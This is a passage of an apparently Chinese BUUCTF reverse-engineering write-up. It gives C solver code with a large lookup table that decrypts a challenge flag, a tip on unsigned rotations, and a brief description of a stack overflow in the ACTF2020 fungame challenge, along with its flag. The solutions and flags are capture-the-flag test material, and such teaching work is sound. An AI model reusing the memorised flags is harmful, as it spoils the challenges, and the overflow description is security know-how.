<span class="number">0</span>, <span class="number">152</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">122</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">     <span class="number">51</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">84</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">11</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">67</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">237</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">207</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">172</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">98</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>, <span class="number">228</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">179</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">     <span class="number">28</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">169</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">201</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">8</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">232</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">149</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">128</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">223</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>, <span class="number">148</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">250</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">117</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">143</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">63</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>, <span class="number">166</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">71</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">7</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">167</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">252</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>, <span class="number">243</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">115</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">     <span class="number">23</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">186</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">131</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">89</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">60</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">     <span class="number">25</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">230</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">133</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">79</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">168</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">104</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">107</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">129</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>, <span class="number">178</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">113</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">100</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">218</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">139</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>, <span class="number">248</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">235</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">     <span class="number">15</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">75</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">112</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">86</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">157</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">     <span class="number">53</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">30</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">36</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">14</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">94</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">     <span class="number">99</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">88</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">209</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>, <span class="number">162</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">37</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">     <span class="number">34</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">124</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">59</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">33</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">120</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">135</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">212</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">70</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">     <span class="number">87</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">159</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">211</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">39</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">82</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">     <span class="number">76</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">54</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">2</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>, <span class="number">231</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">160</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">196</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">200</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">158</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>, <span class="number">234</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">191</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">138</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">210</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">64</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>, <span class="number">199</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">56</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">181</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">163</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">247</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>, <span class="number">242</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">206</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">249</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">97</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">21</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>, <span class="number">161</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">224</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">174</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">93</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">164</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>, <span class="number">155</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">52</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">     <span class="number">26</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">85</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">173</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>, <span class="number">147</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">50</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">     <span class="number">48</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">245</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">140</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>, <span class="number">177</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">227</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">     <span class="number">29</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">246</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">226</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">46</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">130</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">102</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">202</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">96</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>, <span class="number">192</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">41</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">     <span class="number">35</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">171</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">13</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">83</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">78</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">111</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">213</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">219</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">55</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">69</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">222</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">253</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">142</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">47</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">255</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">106</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">114</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>, <span class="number">109</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">108</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">     <span class="number">91</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">81</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">141</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">27</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">175</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">146</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">187</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">221</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>, <span class="number">188</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">     <span class="number">17</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">217</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">92</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">65</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">31</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">     <span class="number">16</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">90</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">216</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">10</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">193</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">     <span class="number">49</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">136</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">165</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>, <span class="number">205</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">123</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">189</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">45</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">116</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>, <span class="number">208</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">18</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">184</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">229</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">180</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>, <span class="number">176</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">137</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">105</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">151</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">74</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">12</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">150</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">119</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">126</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">101</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>, <span class="number">185</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">241</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">9</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">197</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">110</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>, <span class="number">198</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">132</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">     <span class="number">24</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">240</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">125</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>, <span class="number">236</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">58</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">220</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">77</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">32</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>, <span class="number">121</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">238</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">     <span class="number">95</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">62</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">215</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>, <span class="number">203</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">57</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">     <span class="number">72</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">198</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">186</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>, <span class="number">177</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">163</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">     <span class="number">80</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">51</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">170</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">86</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">151</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">145</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">125</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">103</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>, <span class="number">220</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">34</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">112</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">178</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> v2;</span><br><span class="line">    v2 = data[(x &amp;amp; <span class="number">0xff</span>) * <span class="number">4</span>];</span><br><span class="line">    x &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    v2 |= data[(x &amp;amp; <span class="number">0xff</span>) * <span class="number">4</span>] &lt;&lt; <span class="number">8</span>;</span><br><span class="line">    x &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    v2 |= data[(x &amp;amp; <span class="number">0xff</span>) * <span class="number">4</span>] &lt;&lt; <span class="number">16</span>;</span><br><span class="line">    x &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    v2 |= data[(x &amp;amp; <span class="number">0xff</span>) * <span class="number">4</span>] &lt;&lt; <span class="number">24</span>;</span><br><span class="line">    <span class="keyword">return</span> __ROL4__(v2, <span class="number">12</span>) ^ (__ROL4__(v2, <span class="number">8</span>) ^ __ROR4__(v2, <span class="number">2</span>)) ^ __ROR4__(v2, <span class="number">6</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> ans[<span class="number">20</span>];</span><br><span class="line">    ans[<span class="number">0</span>] = <span class="number">190</span>;</span><br><span class="line">    ans[<span class="number">1</span>] = <span class="number">4</span>;</span><br><span class="line">    ans[<span class="number">2</span>] = <span class="number">6</span>;</span><br><span class="line">    ans[<span class="number">3</span>] = <span class="number">128</span>;</span><br><span class="line">    ans[<span class="number">4</span>] = <span class="number">197</span>;</span><br><span class="line">    ans[<span class="number">5</span>] = <span class="number">175</span>;</span><br><span class="line">    ans[<span class="number">6</span>] = <span class="number">118</span>;</span><br><span class="line">    ans[<span class="number">7</span>] = <span class="number">71</span>;</span><br><span class="line">    ans[<span class="number">8</span>] = <span class="number">159</span>;</span><br><span class="line">    ans[<span class="number">9</span>] = <span class="number">204</span>;</span><br><span class="line">    ans[<span class="number">10</span>] = <span class="number">64</span>;</span><br><span class="line">    ans[<span class="number">11</span>] = <span class="number">31</span>;</span><br><span class="line">    ans[<span class="number">12</span>] = <span class="number">216</span>;</span><br><span class="line">    ans[<span class="number">13</span>] = <span class="number">191</span>;</span><br><span class="line">    ans[<span class="number">14</span>] = <span class="number">146</span>;</span><br><span class="line">    ans[<span class="number">15</span>] = <span class="number">239</span>;</span><br><span class="line">    <span class="type">int</span> loop[<span class="number">50</span>];</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        loop[i] = (ans[<span class="number">12</span> - i * <span class="number">4</span>] &lt;&lt; <span class="number">24</span>) + (ans[<span class="number">12</span> - <span class="number">4</span> * i + <span class="number">1</span>] &lt;&lt; <span class="number">16</span>) + (ans[<span class="number">12</span> - i * <span class="number">4</span> + <span class="number">2</span>] &lt;&lt; <span class="number">8</span>) + ans[<span class="number">12</span> - i * <span class="number">4</span> + <span class="number">3</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">4</span>; i &lt; <span class="number">30</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        loop[i] = loop[i - <span class="number">4</span>] ^ <span class="built_in">func</span>(loop[i - <span class="number">3</span>] ^ loop[i - <span class="number">2</span>] ^ loop[i - <span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">29</span>; i &gt;= <span class="number">26</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c%c%c%c&quot;</span>, ((<span class="type">char</span>*)&amp;amp;loop[i])[<span class="number">0</span>], ((<span class="type">char</span>*)&amp;amp;loop[i])[<span class="number">1</span>], ((<span class="type">char</span>*)&amp;amp;loop[i])[<span class="number">2</span>], ((<span class="type">char</span>*)&amp;amp;loop[i])[<span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font color = #ff0000>血的教训：写循环位移要定义成unsigned类型。不unsigned的话，右移时整数补0，负数补1，然后就错啦！</font><br>得到flag：ddwwxxssxaxwwaasasyywwdd-c2N0Zl85MTAy(fl4g_is_s0_ug1y!)</p><h2 id="ACTF新生赛2020-fungame"><a href="#ACTF新生赛2020-fungame" class="headerlink" title="[ACTF新生赛2020]fungame"></a>[ACTF新生赛2020]fungame</h2><p>题出的很好，下次别出了。<br>见面看到一个加密，这个很简单。<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-3/%5BACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020%5Dfungame1.png"><br>解出来交上去就可以发现错啦！<br>看看下一个函数：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-3/%5BACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020%5Dfungame2.png"><br>这个函数很神奇，它把16字节的东西赋值给了12字节的空间，这会造成栈溢出。对，这其实是一个pwn题。<br>跟踪x可以发现<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-3/%5BACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020%5Dfungame3.png"><br>于是解得flag：Re_1s_So0_funny!&#x3D;#@a1s0_pWn</p><h2 id="羊城杯-2020-Bytecode"><a href="#羊城杯-2020-Bytecode" class="headerlink" title="[羊城杯 2020]Bytecode"></a>[羊城杯 